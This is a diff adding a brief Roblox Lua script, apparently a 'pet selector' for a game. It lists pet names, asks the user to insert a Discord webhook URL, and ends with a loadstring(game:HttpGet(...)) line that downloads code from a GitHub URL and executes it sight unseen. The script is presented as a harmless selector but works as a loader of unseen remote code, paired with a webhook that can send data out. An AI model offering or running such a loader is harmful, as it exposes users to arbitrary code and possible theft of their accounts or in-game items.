@@ -1,0 +1,8 @@
+Pets = {
+    "Queen Bee",
+    "Raccoon",
+    "Dragonfly",
+    "Red Fox"
+}
+Webhook = "UR DISCORD WEBHOOK HERE"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/PetSelector/refs/heads/main/GaG"))()
